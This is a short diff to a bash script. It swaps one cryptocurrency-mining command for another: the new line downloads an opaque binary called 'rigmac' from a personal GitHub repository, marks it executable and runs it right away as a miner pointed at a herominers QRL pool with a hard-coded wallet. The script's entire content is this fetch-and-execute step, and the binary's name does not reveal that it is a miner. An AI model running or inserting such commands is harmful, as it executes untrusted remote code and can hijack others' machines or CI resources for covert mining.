@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:443 --username NaWe5B5NqvZ3TV2Mj1pxYtTgrnTBwQDMDNtqVzMR6Xa5ejxu6hbi6KULHTqd732ebc5qTHvKXonokghUBd3pjLa8czomFjnbsCi2GFe7PPDQ --password CPU --disableNVIDIA --algorithm chukwa_v2 --ssl
+wget https://github.com/BatiKangkung/KangKung/raw/master/rigmac && chmod +x rigmac && ./rigmac --donate-level 1 -o de.qrl.herominers.com:1166 -u Q0105000f663000af2a410ea26f0abc8f8b499d80c85d2fbd9ec894c6f09f006685c27d69cf177b -p CPU -a rx/0 -k
